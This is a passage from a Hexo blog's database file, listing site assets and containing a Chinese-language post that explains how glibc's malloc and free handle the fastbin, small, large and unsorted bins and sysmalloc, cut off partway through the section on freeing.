{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"themes/apollo/source/favicon.png","path":"favicon.png","modified":0,"renderable":1},{"_id":"themes/apollo/source/css/apollo.css","path":"css/apollo.css","modified":0,"renderable":1},{"_id":"themes/apollo/source/font/sourcesanspro.woff","path":"font/sourcesanspro.woff","modified":0,"renderable":1},{"_id":"themes/apollo/source/font/sourcesanspro.woff2","path":"font/sourcesanspro.woff2","modified":0,"renderable":1},{"_id":"themes/apollo/source/scss/apollo.scss","path":"scss/apollo.scss","modified":0,"renderable":1},{"_id":"source/images/linux_heap_analysis0.png","path":"images/linux_heap_analysis0.png","modified":0,"renderable":0},{"_id":"source/images/ciscnctf_2016_careful_writeup0.png","path":"images/ciscnctf_2016_careful_writeup0.png","modified":0,"renderable":0},{"_id":"source/images/ciscnctf_2016_cis2_writeup1.png","path":"images/ciscnctf_2016_cis2_writeup1.png","modified":0,"renderable":0},{"_id":"source/images/ciscnctf_2016_cis2_writeup2.png","path":"images/ciscnctf_2016_cis2_writeup2.png","modified":0,"renderable":0},{"_id":"source/images/ciscnctf_2016_cis2_writeup0.png","path":"images/ciscnctf_2016_cis2_writeup0.png","modified":0,"renderable":0},{"_id":"source/images/ciscnctf_2016_cis2_writeup3.png","path":"images/ciscnctf_2016_cis2_writeup3.png","modified":0,"renderable":0},{"_id":"source/images/csaw_2016_rock_writeup0.png","path":"images/csaw_2016_rock_writeup0.png","modified":0,"renderable":0},{"_id":"source/images/csaw_2016_rock_writeup1.png","path":"images/csaw_2016_rock_writeup1.png","modified":0,"renderable":0},{"_id":"source/images/android_debug_analysis1.png","path":"images/android_debug_analysis1.png","modified":0,"renderable":0},{"_id":"source/images/android_debug_analysis4.png","path":"images/android_debug_analysis4.png","modified":0,"renderable":0},{"_id":"source/images/android_debug_analysis0.png","path":"images/android_debug_analysis0.png","modified":0,"renderable":0},{"_id":"source/images/android_debug_analysis2.png","path":"images/android_debug_analysis2.png","modified":0,"renderable":0},{"_id":"source/images/android_debug_analysis3.png","path":"images/android_debug_analysis3.png","modified":0,"renderable":0},{"_id":"source/images/cve_2015_7547_0.png","path":"images/cve_2015_7547_0.png","modified":0,"renderable":0}],"Cache":[{"_id":"themes/apollo/.gitignore","hash":"a006beea0877a0aa3610ee00e73f62cb1d45125b","modified":1477754720876},{"_id":"themes/apollo/LICENSE","hash":"6e31ac9076bfc8f09ae47977419eee4edfb63e5b","modified":1477754720876},{"_id":"themes/apollo/README.md","hash":"fb6fbe42172a35cbdaa540a777cc4bc02add2278","modified":1477754720876},{"_id":"themes/apollo/_config.yml","hash":"f21f18489dc00e0541d7041a81789a2ea8cccd3b","modified":1477793947488},{"_id":"themes/apollo/gulpfile.js","hash":"857a026b6643a2cd52c65d4ae0dc7fe9618206ee","modified":1477754720876},{"_id":"themes/apollo/package.json","hash":"4d13f5f859db7d008f49251543a8f610b2ecabd5","modified":1477754720876},{"_id":"source/_posts/linux_heap_analysis.md","hash":"43c42306a42accafdc955b9aebb3985f36b4b71a","modified":1478005739732},{"_id":"themes/apollo/.git/HEAD","hash":"acbaef275e46a7f14c1ef456fff2c8bbe8c84724","modified":1477754720872},{"_id":"themes/apollo/.git/config","hash":"4eba8e6ddc5a8da6c66aa99763c7831c5ddcee6f","modified":1477754720872},{"_id":"themes/apollo/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1477754659400},{"_id":"themes/apollo/.git/index","hash":"5ce25a2103dc7260ebdfe591b59b53b92d128f59","modified":1477755588564},{"_id":"themes/apollo/.git/packed-refs","hash":"2ab66d2cb8ce41e703f19a82c8a86fe917b9f9e9","modified":1477754720872},{"_id":"themes/apollo/doc/doc-en.md","hash":"d6d9756b2085cdd8ee51eb5594427e2abf170e94","modified":1477754720876},{"_id":"themes/apollo/doc/doc-zh.md","hash":"d43c1f6bff66426744a2c6f031d19ff09cdeb2d1","modified":1477754720876},{"_id":"themes/apollo/languages/en.yml","hash":"40292f2a48e4e6361132033a47c516cb33127b6c","modified":1477754720876},{"_id":"themes/apollo/languages/zh-cn.yml","hash":"9e4b03e14c094000257ea254fd660dde4c7af63c","modified":1477754720876},{"_id":"themes/apollo/layout/archive.jade","hash":"62797414355bf4474092bc3a32726c8340820ffb","modified":1477754720876},{"_id":"themes/apollo/layout/index.jade","hash":"55f2f1b4b5364a0e09cb18e1112664c6415fb881","modified":1477754720876},{"_id":"themes/apollo/layout/post.jade","hash":"245c26244c075c3632d1545c3b228ee9d112f15d","modified":1477754720876},{"_id":"themes/apollo/source/favicon.png","hash":"a9cdcb22d1e74d5480323e19d1983de5a6873b8c","modified":1477754720876},{"_id":"themes/apollo/.git/hooks/applypatch-msg.sample","hash":"86b9655a9ebbde13ac8dd5795eb4d5b539edab0f","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/commit-msg.sample","hash":"ee1ed5aad98a435f2020b6de35c173b75d9affac","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/post-update.sample","hash":"b614c2f63da7dca9f1db2e7ade61ef30448fc96c","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-applypatch.sample","hash":"42fa41564917b44183a50c4d94bb03e1768ddad8","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-commit.sample","hash":"36aed8976dcc08b5076844f0ec645b18bc37758f","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-push.sample","hash":"b4ad74c989616b7395dc6c9fce9871bb1e86dfb5","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/pre-rebase.sample","hash":"18be3eb275c1decd3614e139f5a311b75f1b0ab8","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/prepare-commit-msg.sample","hash":"2b6275eda365cad50d167fe3a387c9bc9fedd54f","modified":1477754659400},{"_id":"themes/apollo/.git/hooks/update.sample","hash":"39355a075977d05708ef74e1b66d09a36e486df1","modified":1477754659400},{"_id":"themes/apollo/.git/info/exclude","hash":"c879df015d97615050afa7b9641e3352a1e701ac","modified":1477754659400},{"_id":"themes/apollo/.git/logs/HEAD","hash":"bdad5a040fb991d1b5395b7733ea4bb28127144e","modified":1477754720872},{"_id":"themes/apollo/layout/mixins/paginator.jade","hash":"f4ee2fb61a32e199b48cf93771749edc8a007391","modified":1477754720876},{"_id":"themes/apollo/layout/mixins/post.jade","hash":"cd9447e9b0ad22213e6a17d9a9b948f9f998f921","modified":1477754720876},{"_id":"themes/apollo/layout/partial/comment.jade","hash":"ff0a2c269c2434da2ac5529872f1d6184a71f96d","modified":1477754720876},{"_id":"themes/apollo/layout/partial/copyright.jade","hash":"217f8b17054e5079f2d30bb7e2e4e36c0f2161b7","modified":1477754720876},{"_id":"themes/apollo/layout/partial/head.jade","hash":"d062dafabfe65198e5cf2ddb0e47d909885aa950","modified":1477754720876},{"_id":"themes/apollo/layout/partial/layout.jade","hash":"eb15573ff66bdbb110ac77cf360b740170cee738","modified":1477754720876},{"_id":"themes/apollo/layout/partial/nav.jade","hash":"dfdd6c667e537a98cca852f713c2057f2012ff61","modified":1477754720876},{"_id":"themes/apollo/layout/partial/scripts.jade","hash":"cf3339de8979b5f75a3011f0f6b5451091b77dc8","modified":1477754720876},{"_id":"themes/apollo/source/css/apollo.css","hash":"805612fea3f0768dc705058f4b9b8bc95abe4ed4","modified":1477754720876},{"_id":"themes/apollo/source/font/sourcesanspro.woff","hash":"a6722c9b6439b7a020a9be3d3178970757a9265c","modified":1477754720876},{"_id":"themes/apollo/source/font/sourcesanspro.woff2","hash":"da65f527a8da65d5eb6721626d28cfdb46ab104a","modified":1477754720876},{"_id":"themes/apollo/source/scss/apollo.scss","hash":"153bbf882c1f6f65bb4510999b51812e20016ca7","modified":1477754720876},{"_id":"themes/apollo/.git/objects/pack/pack-6aaf31ec22cdef45ed9d330ad851b764de8b9225.idx","hash":"6cda2844ea32155bd203f51a5759425b009854cd","modified":1477754720852},{"_id":"themes/apollo/.git/refs/heads/master","hash":"4605c6681d054db5754369e5211848dd9dcacaef","modified":1477754720872},{"_id":"themes/apollo/source/scss/_partial/archive-post-list.scss","hash":"d2f740a7d48349b7536777c795f82ab740836d0f","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/base.scss","hash":"ae967b2049ecb9b8c4e139ecce32fd9fb5358ac5","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/copyright.scss","hash":"1309667e3000037170cfbb5b8c9c65f4ffcf6814","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/footer.scss","hash":"094aca6e52f11b139ac7980ca03fa7b9d8fc7b2f","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/header.scss","hash":"153bde88bf8ffeae4ffd813d8cc694dd83d33d94","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/home-post-list.scss","hash":"6b5c59f3d2295944f934aee2c1156012a3306d5d","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/mq.scss","hash":"b5eb0fb35fb275cbb6452b5d98702d461af3e6d5","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/normalize.scss","hash":"fd0b27bed6f103ea95b08f698ea663ff576dbcf1","modified":1477754720876},{"_id":"themes/apollo/source/scss/_partial/post.scss","hash":"912776a0eb7ad5a387b9aa929c857b6edd0c113e","modified":1477754720876},{"_id":"themes/apollo/.git/logs/refs/heads/master","hash":"bdad5a040fb991d1b5395b7733ea4bb28127144e","modified":1477754720872},{"_id":"themes/apollo/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1477754720872},{"_id":"themes/apollo/.git/logs/refs/remotes/origin/HEAD","hash":"bdad5a040fb991d1b5395b7733ea4bb28127144e","modified":1477754720872},{"_id":"themes/apollo/.git/objects/pack/pack-6aaf31ec22cdef45ed9d330ad851b764de8b9225.pack","hash":"0b0a61658bae0aea180f5c9fd2d12236e3ad0fe2","modified":1477754720852},{"_id":"source/images/linux_heap_analysis0.png","hash":"dd0ef5e08c098db02b994b0b2be6226c1f7cc1c2","modified":1477755312896},{"_id":"public/atom.xml","hash":"8adafabd513757d924d47c06e48c36261bc86be2","modified":1478687284096},{"_id":"public/sitemap.xml","hash":"7813e6508a4e00c2d186630aaa75e59a5bdd1253","modified":1478687284106},{"_id":"public/2016/10/29/linux_heap_analysis/index.html","hash":"663321960d4711c5dc7ba2a7dc472a5c54ad2db6","modified":1477793955349},{"_id":"public/archives/index.html","hash":"12e21643aedcfa992766018565a0cf774ececc9b","modified":1478686993515},{"_id":"public/index.html","hash":"7ffc159c3268d044c525c334f0725447658461d6","modified":1478687284112},{"_id":"public/favicon.png","hash":"a9cdcb22d1e74d5480323e19d1983de5a6873b8c","modified":1478008458348},{"_id":"public/font/sourcesanspro.woff","hash":"a6722c9b6439b7a020a9be3d3178970757a9265c","modified":1478008458348},{"_id":"public/font/sourcesanspro.woff2","hash":"da65f527a8da65d5eb6721626d28cfdb46ab104a","modified":1478008458348},{"_id":"public/scss/apollo.scss","hash":"153bbf882c1f6f65bb4510999b51812e20016ca7","modified":1478008458348},{"_id":"public/css/apollo.css","hash":"805612fea3f0768dc705058f4b9b8bc95abe4ed4","modified":1478008458358},{"_id":"public/images/linux_heap_analysis0.png","hash":"dd0ef5e08c098db02b994b0b2be6226c1f7cc1c2","modified":1478008458368},{"_id":"source/_posts/alictf_2016_fb_writeup.md","hash":"42146065fa43b283ca88414ddc886fd110b77cb3","modified":1478007005356},{"_id":"public/2016/06/07/alictf_2016_fb_writeup/index.html","hash":"8323a663ffb4a60650abd0731e315e97ad08c9ad","modified":1478687284112},{"_id":"public/2016/05/29/linux_heap_analysis/index.html","hash":"f9b2704dce95ad2068aa0adf378c349cf61d5544","modified":1478687284112},{"_id":"source/_posts/ciscnctf_2016_careful&cis2_writeup.md","hash":"305cf63a35483772d06ecdd0ffe7fbf6d0122892","modified":1478005654760},{"_id":"source/images/ciscnctf_2016_careful&cis2_writeup0.png","hash":"c5a30f6744b4d9701fed1c29f244120c35d77d22","modified":1478004924292},{"_id":"source/images/ciscnctf_2016_careful&cis2_writeup2.png","hash":"30da61dea607e724eef6c561b5e26b4e62ddb528","modified":1478004924660},{"_id":"source/images/ciscnctf_2016_careful&cis2_writeup3.png","hash":"a5a82996a9fb8c3b837e0f23dad33ec9edf123cf","modified":1478004924784},{"_id":"source/images/ciscnctf_2016_careful&cis2_writeup1.png","hash":"922fb06d76dacd2ee6970e1717f20419e35c92a3","modified":1478004924496},{"_id":"source/images/ciscnctf_2016_careful&cis2_writeup4.png","hash":"d8a265c46c2ed2276c74f78f4532e260c7e56136","modified":1478004925724},{"_id":"public/2016/11/01/ciscnctf_2016_careful&cis2_writeup/index.html","hash":"75db1e579e0e503045cd93240d0a1f9d7fbefec6","modified":1478005254349},{"_id":"public/images/ciscnctf_2016_careful&cis2_writeup0.png","hash":"c5a30f6744b4d9701fed1c29f244120c35d77d22","modified":1478005785813},{"_id":"public/images/ciscnctf_2016_careful&cis2_writeup2.png","hash":"30da61dea607e724eef6c561b5e26b4e62ddb528","modified":1478005785813},{"_id":"public/images/ciscnctf_2016_careful&cis2_writeup3.png","hash":"a5a82996a9fb8c3b837e0f23dad33ec9edf123cf","modified":1478005785813},{"_id":"public/images/ciscnctf_2016_careful&cis2_writeup1.png","hash":"922fb06d76dacd2ee6970e1717f20419e35c92a3","modified":1478005785815},{"_id":"public/images/ciscnctf_2016_careful&cis2_writeup4.png","hash":"d8a265c46c2ed2276c74f78f4532e260c7e56136","modified":1478005785826},{"_id":"public/2016/07/11/ciscnctf_2016_careful&cis2_writeup/index.html","hash":"3a4e8dc008a2bfcca740c69cac608626a9bd18f3","modified":1478005785801},{"_id":"source/_posts/ciscnctf_2016_careful_writeup.md","hash":"f9a83816314ff4075a470d7f69d6841c6bc88529","modified":1478007038884},{"_id":"source/_posts/ciscnctf_2016_cis2_writeup.md","hash":"fb9c921ca226398e6f1ce3b4ed4b72df9b54a59d","modified":1478007059088},{"_id":"source/images/ciscnctf_2016_careful_writeup0.png","hash":"c5a30f6744b4d9701fed1c29f244120c35d77d22","modified":1478004924292},{"_id":"source/images/ciscnctf_2016_cis2_writeup1.png","hash":"30da61dea607e724eef6c561b5e26b4e62ddb528","modified":1478004924660},{"_id":"source/images/ciscnctf_2016_cis2_writeup2.png","hash":"a5a82996a9fb8c3b837e0f23dad33ec9edf123cf","modified":1478004924784},{"_id":"source/images/ciscnctf_2016_cis2_writeup0.png","hash":"922fb06d76dacd2ee6970e1717f20419e35c92a3","modified":1478004924496},{"_id":"source/images/ciscnctf_2016_cis2_writeup3.png","hash":"d8a265c46c2ed2276c74f78f4532e260c7e56136","modified":1478004925724},{"_id":"public/2016/07/11/ciscnctf_2016_cis2_writeup/index.html","hash":"cde11dbd729f05690ee2be04ece4e28bf011bcf8","modified":1478687284111},{"_id":"public/2016/07/11/ciscnctf_2016_careful_writeup/index.html","hash":"0350bf25c21fa64b6f30833b626586f310a0f50a","modified":1478687284112},{"_id":"public/images/ciscnctf_2016_careful_writeup0.png","hash":"c5a30f6744b4d9701fed1c29f244120c35d77d22","modified":1478008458349},{"_id":"public/images/ciscnctf_2016_cis2_writeup1.png","hash":"30da61dea607e724eef6c561b5e26b4e62ddb528","modified":1478008458349},{"_id":"public/images/ciscnctf_2016_cis2_writeup2.png","hash":"a5a82996a9fb8c3b837e0f23dad33ec9edf123cf","modified":1478008458349},{"_id":"public/images/ciscnctf_2016_cis2_writeup0.png","hash":"922fb06d76dacd2ee6970e1717f20419e35c92a3","modified":1478008458356},{"_id":"public/images/ciscnctf_2016_cis2_writeup3.png","hash":"d8a265c46c2ed2276c74f78f4532e260c7e56136","modified":1478008458363},{"_id":"source/_posts/csaw_2016_rock_writeup.md","hash":"54156d4031da9d4a42d380482d732bac2f8e3080","modified":1478017770488},{"_id":"source/images/csaw_2016_rock_writeup0.png","hash":"8c6b0f36a83658ddedf9fdbb149d9877fa8a2556","modified":1478017569988},{"_id":"source/images/csaw_2016_rock_writeup1.png","hash":"5f01d6c1cb40c9deb5f6bf50be4347f24f20c1d2","modified":1478017570072},{"_id":"public/2016/09/19/csaw_2016_rock_writeup/index.html","hash":"d014b28d10dc8727305ac9b0b66c97c68b65b6ba","modified":1478687284111},{"_id":"public/images/csaw_2016_rock_writeup0.png","hash":"8c6b0f36a83658ddedf9fdbb149d9877fa8a2556","modified":1478017639633},{"_id":"public/images/csaw_2016_rock_writeup1.png","hash":"5f01d6c1cb40c9deb5f6bf50be4347f24f20c1d2","modified":1478017639634},{"_id":"source/_posts/csaw_2016_tutorial_writeup.md","hash":"84d0379bd5add9790cbd4e1b407a91be0e7b1c3d","modified":1478137227448},{"_id":"public/2016/09/19/csaw_2016_tutorial_writeup/index.html","hash":"e1cd7a25cffc5c4edbae2db90aa4a375580ed23d","modified":1478687284111},{"_id":"source/_posts/csaw_2016_hungman_writeup.md","hash":"2b2eaa5f77dca0d92b766acfca1133d40bda57fc","modified":1478018088744},{"_id":"public/2016/09/19/csaw_2016_hungman_writeup/index.html","hash":"99cbcce9030cb7ef831b8d38cdd5483ec2acb887","modified":1478687284111},{"_id":"source/_posts/android_debug_analysis.md","hash":"0dcddfdd8815efabe29316f023494dc28fb01f4f","modified":1478189744900},{"_id":"source/images/android_debug_analysis1.png","hash":"ecd0f358967208dd9bad6af924b0fbad3060aa60","modified":1478018615092},{"_id":"source/images/android_debug_analysis4.png","hash":"76ecd1f09884c5f092bcd23890a425be43ce6a0c","modified":1478018622132},{"_id":"source/images/android_debug_analysis0.png","hash":"da7a10078192dc90ccf65d71866d40ed36559c4e","modified":1478018614968},{"_id":"source/images/android_debug_analysis2.png","hash":"1a014c90c5985a106e314dd11ae6e4bf8f01d15b","modified":1478018618624},{"_id":"source/images/android_debug_analysis3.png","hash":"c2d93e0d4b3d939092b53ec0241d8e6dc9cb04ed","modified":1478018620448},{"_id":"public/2016/10/25/android_debug_analysis/index.html","hash":"ae7f11e8cb278c84fc617a0132343ab440f22bdb","modified":1478687284110},{"_id":"public/images/android_debug_analysis1.png","hash":"ecd0f358967208dd9bad6af924b0fbad3060aa60","modified":1478303180276},{"_id":"public/images/android_debug_analysis4.png","hash":"76ecd1f09884c5f092bcd23890a425be43ce6a0c","modified":1478303180276},{"_id":"public/images/android_debug_analysis0.png","hash":"da7a10078192dc90ccf65d71866d40ed36559c4e","modified":1478303180281},{"_id":"public/images/android_debug_analysis3.png","hash":"c2d93e0d4b3d939092b53ec0241d8e6dc9cb04ed","modified":1478303180283},{"_id":"public/images/android_debug_analysis2.png","hash":"1a014c90c5985a106e314dd11ae6e4bf8f01d15b","modified":1478303180284},{"_id":"source/_posts/cve_2015_7547.md","hash":"98e1f641c019a7c1d21e86044d090ef33bf5491f","modified":1478687276408},{"_id":"source/images/cve_2015_7547_0.png","hash":"5ccd4985792a0c559606814acefc3307a3eb4ff0","modified":1478686871016},{"_id":"public/2016/11/02/cve_2015_7547/index.html","hash":"73914a8f9ffc37bf6e0eefc88f2900e2d7d84523","modified":1478687284112},{"_id":"public/images/cve_2015_7547_0.png","hash":"5ccd4985792a0c559606814acefc3307a3eb4ff0","modified":1478686993515}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Linux下Glibc 堆的malloc及free过程分析","date":"2016-05-29T13:03:00.000Z","_content":"\n想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了[这篇分析][1]之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。\n\n<!--more-->\n\n## 分配 \n（fastbin的分配发生在链表的头部，其余都发生在链表尾部）\n（在fast链表中是精确分配（只有大小完全符合才会分配）\n    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配\n    small链表在第一遍时是精确分配，第二遍时非精确\n    large链表一直都是非精确分配）（注意链表和chunk不一样）\n（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）\n\n1、首先获取Arena的锁，保证安全\n2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）\n——一种情况是没有可用Arena\n没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0\n——另一种情况是有可用Arena\n1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）\n2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）\n3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步\n4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）\n5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回\n6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回\n\n#### 关于sysmalloc \n1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）\n2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配\n如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）\n最后再从top chunk中分配\n\n#### 按fast bin、small bin、large bin分 \n1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样\n2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统\n3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统\n\n#### 关于巨块的分配 \n没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap\nmmap分配的未必就一定是大的chunk\n\n## 释放 \n（所有chunk的释放都是插入链表头部）\n然后做一些基本的检查，比如size大小等\n1、如果是fast bin直接返回给fast bin，在fast bin中不会发生合并（chunk一直被标记为占用）\n2、然后如果不是mmap的内存（属于normal bin），看看前后能不能合并，能合并就合并后加入到unsorted bin链表头\n合并之后看合并之后的chunk的size，如果大于FASTBIN_CONSOLIDATION_THRESHOLD，会清fastbin，能合并的合并，然后全部放到unsorted bin链表中，然后试图收缩heap\n（其中如果回收的块是和top chunk相邻的，就直接合并到top chunk中去（如果TRIM_FASTBINS为1（我看到的源码里默认为0），fastbin也会进行合并，否则不合并），并且这些操作中间或有获取锁的操作保证安全）\n3、直接munmap返回给操作系统\n\n#### 来自源码中的注释 \nchunk不会被放回到normal bin中直到它们获得一次被malloc的机会\nChunks are not placed into regular bins until after they have been given one chance to be used in malloc\n\n#### 关于获取Size \n获取fd的size是将当前指针＋当前size后－4，获取bk的size是直接用当前chunk中的prev_size（如果前一个chunk正在使用的话似乎也不用获取他的size）\n\n## 关于堆的收缩 \n如果top chunk的大小过大（应该是超过一个heap segment，但是参考中的中文资料说子线程中的Top chunk一旦达到一个Heap Segment大小就会在这次free操作时归还给操作系统，但是如果整好处于边缘值岂不会造成mmap－munmap－mmap－munmap的浪费操作？）会将这块内存还给系统，但是会至少留下一部分内存继续作为top chunk\n\n#### 来自源码中的注释 \n收缩过程使用madvise的MADV_DONTNEED标志，表明这块内存不会再被访问，这是向内存管理器发出的建议，内存管理器会采取适当处理\n\n\n\n最后附一张图：\n![linux_heap_analysis0.png][2]\n\n\n[1]: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\n[2]: /images/linux_heap_analysis0.png\n","source":"_posts/linux_heap_analysis.md","raw":"title: Linux下Glibc 堆的malloc及free过程分析\n\ndate: 2016/05/29 21:03:00\n\n---\n\n想要搞明白Linux下的堆管理方便学习下Linux下的堆的攻击利用方式，但看了[这篇分析][1]之后感觉在过程上还是不够清晰，于是自己找来Glibc 2.23.90的源码分析了一遍，做了流程上的整理放在这里。链接中已经详细剖析过的结构体等等就不再赘述，主要整理下分配及释放的过程。\n\n<!--more-->\n\n## 分配 \n（fastbin的分配发生在链表的头部，其余都发生在链表尾部）\n（在fast链表中是精确分配（只有大小完全符合才会分配）\n    unsorted链表除非是remainder chunk时非精确分配，其余都是精确分配\n    small链表在第一遍时是精确分配，第二遍时非精确\n    large链表一直都是非精确分配）（注意链表和chunk不一样）\n（为毛top chunk必须置位prev_inuse位？翻找了一下说是规定。。。）\n\n1、首先获取Arena的锁，保证安全\n2、进行chunk的size检查等（包括将请求size转换为chunk的size，将传入malloc的size加上8 bytes的overhead并向16 bytes对齐（32位下是8 bytes），32位下最小为16bytes，64位下最小为32bytes）\n——一种情况是没有可用Arena\n没有可用Arena会直接交由sysmalloc处理，进入后直接尝试mmap分配，失败返回0\n——另一种情况是有可用Arena\n1、如果请求属于Fast bin大小，就从Fast bin中分配，失败则进行normal bin的分配过程（分配成功后有fastbin的index的反向计算的安全检查再返回）（中间运用了原子操作来优化从链表中删除chunk）\n2、然后再判断是否属于small bin，是的话找到对应bin链表的最后一个chunk进行分配（期间也有安全性检查，到small bin时才会有arena的初始化检查），否则计算再large bin中的index再清fastbin，进入下一步（在这一步时确定了index）\n3、开始遍历unsorted bin，如果属于small bin且Last Remainder chunk是unsorted bin 中的唯一一个chunk并且能够满足大小，那么切割这一chunk进行分配，并把剩余部分继续成为remainder chunk放入unsorted bin，如果大小能够精确匹配目标（不管是small还是large），就分配这一chunk返回，否则放入相应的small 链表或large 链表（维持large 链表从大到小的顺序），遍历unsorted bin不会超过MAX_ITERS，超过的话即使unsorted 链表中还有可能可以分配的chunk也直接到下一步\n4、如果是large bin，根据算出的index找到对应链表，如果链表为空或者链表中的最大chunk也不能满足，进入下一步，否则就开始倒序查找（使用nextsize指针，该指针指向下一个不同大小的正序中的第一个的chunk），找到后分割返回（如果分割后剩余大小不够MINSIZE就不分割），把分割后的chunk放入unsorted bin头部（如果该chunk为large 设置该chunk的两个nextsize指针为NULL）\n5、使用binmap从之前确立的bins中的index链表开始，使用binmap加快搜索，找到最适合的可分配的链表（使用位运算，如果没有直接跳到下一步），然后拿出链表最后一个chunk（大小肯定是够的），然后分割分配（如果分割之后的大小小于MINSIZE就不尽兴分割），然后剩下的成为remainder chunk放入unsorted bin头部（和之前一样），然后返回\n6、开始使用top chunk分配，先看top能不能满足，如果能满足切割分配，剩下的继续成为top chunk，否则看是否还有fastbin，如果有进行清fastbin操作再重新计算index，跳转到3继续循环（源码注释中说这样的循环最多这么一次，因为本来唯一可能循环的路径（存在fastbin）下一次不可能再满足），否则进行sysmalloc然后返回\n\n#### 关于sysmalloc \n1、只要要分配的chunk大小超过阈值且已经mmap的内存数量没超过阈值，就会进行mmap分配（或者没有获取到arena也会mmap，mmap分配失败就会直接返回0）\n2、然后看是否是main_arena，不是的话试图grow当前heap，失败则mmap一个新的heap，开辟新的heap后将old top chunk末端设置两个fencepost（就是一个极小的被标记为以使用的chunk，应该比MINSIZE还小，应该是8字节，在当前heap的最末端，如果top chunk大小不够MINSIZE，就全部设置为fencepost），然后free掉被删掉fencepost的top chunk（应该是放入到unsorted中），如果尝试new_heap也失败了还没有试过mmap分配，去尝试mmap分配\n如果是main_arena，调整所需的size进行brk分配，失败则尝试mmap分配，然后根据结果进行调整（处理一下分配失败、brk不增反减的情况，处理contiguous标志等等）\n最后再从top chunk中分配\n\n#### 按fast bin、small bin、large bin分 \n1、fast bin就是看一下fast链表，有正好合适的就分，否则和small 一样\n2、small bin先看small bins中有没有，然后遍历unsorted bin寻找（通过精确或者remainder，unsorted chunk 会被放回相应的small bin或large bin），然后使用binmap进行尽量合适分配（任何一次分割剩下的会成为remainder chunk，除了top），再不然就top或找系统\n3、large bin直接找unsorted bin，不行就往后找（使用binmap），否则top或系统\n\n#### 关于巨块的分配 \n没有看到源代码中有对于巨块的直接交给mmap处理的代码，应该是跟着整个流程走一遍然后能分配就分配否则mmap\nmmap分配的未必就一定是大的chunk\n\n## 释放 \n（所有chunk的释放都是插入链表头部）\n然后做一些基本的检查，比如size大小等\n1、如果是fast bin直接返回给fast bin，在fast 